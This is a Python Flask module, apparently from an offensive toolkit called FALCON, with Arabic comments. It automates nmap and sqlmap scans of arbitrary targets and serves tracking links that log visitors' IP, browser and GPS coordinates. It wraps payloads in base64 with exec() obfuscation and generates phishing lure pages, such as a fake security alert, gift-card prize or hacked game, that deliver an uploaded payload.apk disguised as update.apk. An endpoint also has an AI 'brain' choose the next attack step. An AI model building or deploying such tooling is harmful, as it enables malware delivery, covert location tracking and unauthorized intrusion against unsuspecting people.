# ================= محرك عراب المافيا (Godfather) - النسخة القوية =================
import os
import json
import requests
import subprocess
import re
from datetime import datetime
from flask import Blueprint, request, jsonify, render_template

godfather_bp = Blueprint('godfather', __name__, template_folder='templates')

BASE_DIR = os.path.dirname(os.path.abspath(__file__))
INTEL_FILE = os.path.join(BASE_DIR, "intel.json")
TRAP_FILE = os.path.join(BASE_DIR, "traps.json")

def load_json(filepath):
    if os.path.exists(filepath):
        try:
            with open(filepath, "r", encoding="utf-8") as f: return json.load(f)
        except: pass
    return {}

def save_json(filepath, data):
    with open(filepath, "w", encoding="utf-8") as f: json.dump(data, f, ensure_ascii=False, indent=2)

# ================= واجهات العراب =================
@godfather_bp.route("/investigate")
def investigate_page():
    return render_template("investigate.html")

@godfather_bp.route("/trap")
def trap_page():
    return render_template("trap.html")

# ================= API: خزنة الاستخبارات =================

@godfather_bp.route("/api/intel/save", methods=["POST"])
def api_intel_save():
    try:
        req = request.get_json()
        target = req.get("target")
        info = req.get("info", {})
        if not target: return jsonify({"success": False, "message": "الهدف مطلوب"})
        
        intel = load_json(INTEL_FILE)
        
        if target not in intel or "analyzed" not in intel[target]:
            # 1. التمييز بين المحلي والعام
            is_local = target.startswith("127.") or target.startswith("192.168.") or target.startswith("10.") or target.startswith("172.")
            
            if is_local:
                info["geo"] = "🏠 عنوان محلي (داخل الشبكة)"
                info["isp"] = "شبكة محلية"
            else:
                try:
                    geo_res = requests.get(f"http://ip-api.com/json/{target}?fields=status,country,city,isp,lat,lon", timeout=5)
                    geo_data = geo_res.json()
                    if geo_data.get("status") == "success":
                        info["geo"] = f"{geo_data.get('city', '')}, {geo_data.get('country', '')}"
                        info["isp"] = geo_data.get("isp", "غير معروف")
                        info["coords"] = f"{geo_data.get('lat', '')}, {geo_data.get('lon', '')}"
                    else:
                        info["geo"] = "غير معروف (IP عام)"
                        info["isp"] = "غير معروف"
                except:
                    info["geo"] = "فشل الاتصال"
                    info["isp"] = "غير معروف"
            
            # 2. فحص المنافذ
            try:
                port_res = subprocess.run(["nmap", "-p", "21,22,23,80,443,8080,3389", "-T4", target], capture_output=True, text=True, timeout=25)
                open_ports = []
                for line in port_res.stdout.splitlines():
                    if "/tcp" in line and "open" in line:
                        open_ports.append(line.split("/")[0])
                info["ports"] = open_ports
            except: info["ports"] = []
            
            # 3. كشف الثغرات التلقائي
            vulnerabilities = []
            if "80" in info.get("ports", []) or "443" in info.get("ports", []):
                try:
                    # فحص SQLi
                    sqli_res = subprocess.run(["sqlmap", "-u", f"http://{target}", "--batch", "--level=1", "--risk=1", "--timeout=10", "--forms"], capture_output=True, text=True, timeout=30)
                    if "vulnerable" in sqli_res.stdout.lower() or "injectable" in sqli_res.stdout.lower():
                        vulnerabilities.append("SQLi (محتمل)")
                except: pass
                
                try:
                    # فحص XSS
                    xss_res = requests.get(f"http://{target}", timeout=5)
                    if "<script>" in xss_res.text.lower() or "javascript:" in xss_res.text.lower():
                        vulnerabilities.append("XSS (محتمل)")
                except: pass
            
            info["vulnerabilities"] = vulnerabilities
            info["analyzed"] = True
        
        if target in intel: intel[target].update(info)
        else: intel[target] = info
        
        save_json(INTEL_FILE, intel)
        return jsonify({"success": True, "message": "تم الحفظ والتحليل"})
    except Exception as e:
        return jsonify({"success": False, "message": str(e)})

@godfather_bp.route("/api/intel/list")
def api_intel_list():
    return jsonify(load_json(INTEL_FILE))

@godfather_bp.route("/api/intel/clear", methods=["POST"])
def api_intel_clear():
    save_json(INTEL_FILE, {})
    save_json(TRAP_FILE, {})
    return jsonify({"success": True, "message": "تم مسح الخزنة"})

@godfather_bp.route("/api/intel/delete", methods=["POST"])
def api_intel_delete():
    req = request.get_json()
    target = req.get("target")
    if target:
        intel = load_json(INTEL_FILE)
        if target in intel:
            del intel[target]
            save_json(INTEL_FILE, intel)
            return jsonify({"success": True, "message": "تم حذف الهدف"})
    return jsonify({"success": False, "message": "الهدف غير موجود"})

# ================= API: صائد الروابط (Trap) =================

@godfather_bp.route("/api/trap/create", methods=["POST"])
def api_trap_create():
    import uuid
    trap_id = str(uuid.uuid4())[:8]
    traps = load_json(TRAP_FILE)
    traps[trap_id] = {"created": datetime.now().strftime("%Y-%m-%d %H:%M:%S"), "visits": []}
    save_json(TRAP_FILE, traps)
    
    # استخدام عنوان الموقع الحالي (سواء كان محلياً أو Cloudflare)
    host = request.host_url.rstrip('/')
    trap_url = f"{host}/t/{trap_id}"
    
    return jsonify({"success": True, "url": trap_url, "trap_id": trap_id})

@godfather_bp.route("/api/trap/list")
def api_trap_list():
    return jsonify(load_json(TRAP_FILE))

@godfather_bp.route("/t/<trap_id>")
def trap_catch(trap_id):
    traps = load_json(TRAP_FILE)
    if trap_id in traps:
        visitor_ip = request.remote_addr
        user_agent = request.headers.get('User-Agent', 'غير معروف')
        lat = request.args.get('lat', '')
        lon = request.args.get('lon', '')
        
        geo = {}
        if lat and lon and lat != 'denied':
            geo = {"lat": lat, "lon": lon}
        
        visit_data = {
            "time": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            "ip": visitor_ip,
            "user_agent": user_agent,
            "geo": geo
        }
        
        if "visits" not in traps[trap_id]: traps[trap_id]["visits"] = []
        traps[trap_id]["visits"].append(visit_data)
        save_json(TRAP_FILE, traps)
        
        intel = load_json(INTEL_FILE)
        if visitor_ip not in intel:
            intel[visitor_ip] = {
                "source": "Trap",
                "deviceType": user_agent[:50],
                "geo": geo,
                "trap_id": trap_id
            }
            save_json(INTEL_FILE, intel)
    
    return "<html><body style='background:#000;color:#0f0;font-family:monospace;text-align:center;padding-top:50px;'><h1>تم التسجيل</h1><p>شكراً لزيارتك.</p></body></html>"

@godfather_bp.route("/api/link/catch")
def api_link_catch():
    return trap_catch(request.args.get('link_id', ''))

# ================= مولد البايلود المموه =================
import base64

@godfather_bp.route("/api/payload/encode", methods=["POST"])
def api_payload_encode():
    try:
        req = request.get_json()
        original_code = req.get("code", "")
        if not original_code:
            return jsonify({"success": False, "message": "الكود مطلوب"})
        
        # تشفير الكود بـ Base64
        encoded = base64.b64encode(original_code.encode('utf-8')).decode('utf-8')
        
        # إنشاء كود بايثون جديد يقوم بفك التشفير وتنفيذ الكود الأصلي
        obfuscated_code = f'''# FALCON Obfuscated Payload
import base64
exec(base64.b64decode("{encoded}").decode("utf-8"))
'''
        
        return jsonify({"success": True, "obfuscated": obfuscated_code, "encoded": encoded})
    except Exception as e:
        return jsonify({"success": False, "message": str(e)})

@godfather_bp.route("/api/payload/decode", methods=["POST"])
def api_payload_decode():
    try:
        req = request.get_json()
        encoded = req.get("encoded", "")
        if not encoded:
            return jsonify({"success": False, "message": "الكود المشفر مطلوب"})
        
        decoded = base64.b64decode(encoded.encode('utf-8')).decode('utf-8')
        return jsonify({"success": True, "decoded": decoded})
    except Exception as e:
        return jsonify({"success": False, "message": str(e)})

@godfather_bp.route("/payload_obfuscator")
def payload_obfuscator_page():
    return render_template("payload_obfuscator.html")

# ================= مولد صفحات التحميل المموهة (Fake Download) =================
import os

@godfather_bp.route("/fake_download")
def fake_download_page():
    return render_template("fake_download.html")

@godfather_bp.route("/api/fake_download/generate", methods=["POST"])
def api_fake_download_generate():
    try:
        req = request.get_json()
        lure_type = req.get("lure_type", "security")
        app_name = req.get("app_name", "System Update")
        
        # تحديد النصوص والألوان بناءً على الطعم
        if lure_type == "security":
            title = "تحديث أمني عاجل"
            description = "تم اكتشاف ثغرة أمنية خطيرة في جهازك. يرجى تحميل هذا التحديث لحماية بياناتك."
            color = "#ff0000"
            icon = "🛡️"
        elif lure_type == "gift":
            title = "مبروك! لقد ربحت"
            description = "لقد ربحت بطاقة شحن بقيمة 50 دولاراً. حمل التطبيق الآن لاستلام جائزتك."
            color = "#ffcc00"
            icon = "🎁"
        elif lure_type == "game":
            title = "تحميل اللعبة المهكرة"
            description = "احصل على نسخة مهكرة من اللعبة مع عملات غير محدودة. حمل الآن!"
            color = "#00ff00"
            icon = "🎮"
        else:
            title = "تحديث النظام"
            description = "يرجى تحميل التحديث الجديد للحصول على أفضل أداء."
            color = "#0088cc"
            icon = "📱"
        
        return jsonify({
            "success": True,
            "title": title,
            "description": description,
            "color": color,
            "icon": icon,
            "app_name": app_name,
            "download_url": "/download/payload.apk"
        })
    except Exception as e:
        return jsonify({"success": False, "message": str(e)})

@godfather_bp.route("/download/payload.apk")
def download_payload():
    from flask import send_file
    # هذا هو ملف APK الذي ستضعه في مجلد FALCON
    apk_path = os.path.join(BASE_DIR, "payload.apk")
    if os.path.exists(apk_path):
        return send_file(apk_path, as_attachment=True, download_name="update.apk")
    else:
        return "⚠️ ملف APK غير موجود. يرجى وضع ملف باسم payload.apk في مجلد FALCON.", 404

@godfather_bp.route("/download_page")
def download_page():
    return render_template("download_page.html")

@godfather_bp.route("/api/upload_payload", methods=["POST"])
def api_upload_payload():
    try:
        file = request.files.get("payload")
        if not file or file.filename == "":
            return jsonify({"success": False, "message": "لم يتم اختيار ملف"})
        
        # التأكد من أن الملف بصيغة APK
        if not file.filename.lower().endswith(".apk"):
            return jsonify({"success": False, "message": "الملف يجب أن يكون بصيغة APK"})
        
        # حفظ الملف باسم payload.apk
        save_path = os.path.join(BASE_DIR, "payload.apk")
        file.save(save_path)
        
        return jsonify({"success": True, "message": "تم رفع التطبيق بنجاح!"})
    except Exception as e:
        return jsonify({"success": False, "message": str(e)})

from brain import search_exploits

@godfather_bp.route("/api/search_exploits", methods=["POST"])
def api_search_exploits():
    try:
        req = request.get_json()
        service = req.get("service", "")
        if not service:
            return jsonify({"success": False, "message": "اسم الخدمة مطلوب"})
        
        exploits = search_exploits(service)
        return jsonify({"success": True, "service": service, "exploits": exploits})
    except Exception as e:
        return jsonify({"success": False, "message": str(e)})

from brain import search_exploits


@godfather_bp.route("/ai_agent")
def ai_agent_page():
    return render_template("ai_agent.html")

# ================= مسار تنفيذ الوكيل (AI Agent) =================
from brain import planner_agent, scanner_agent, ask_brain, load_memory, save_memory

@godfather_bp.route("/api/ai_agent/run", methods=["POST"])
def api_ai_agent_run():
    try:
        req = request.get_json()
        target = req.get("target", "")
        if not target:
            return jsonify({"success": False, "message": "الهدف مطلوب"})
        
        # 1. المخطط (Planner)
        planner_agent(target)
        
        # 2. الماسح (Scanner)
        ports = scanner_agent(target)
        
        # 3. العقل (Brain) يقرر الخطوة التالية
        memory = load_memory()
        prompt = f"الهدف: {target}. المنافذ المفتوحة: {ports}. ما هي الخطوة التالية؟"
        decision = ask_brain(prompt)
        
        # 4. حفظ القرار
        memory["steps"].append({"time": "now", "agent": "Brain", "action": f"قرر: {decision}"})
        save_memory(memory)
        
        # 5. التقرير
        report = {
            "target": target,
            "total_steps": len(memory.get("steps", [])),
            "total_discoveries": len(memory.get("discoveries", [])),
            "discoveries": memory.get("discoveries", []),
            "steps": memory.get("steps", [])
        }
        
        return jsonify({"success": True, "decision": decision, "report": report})
    except Exception as e:
        return jsonify({"success": False, "message": str(e)})
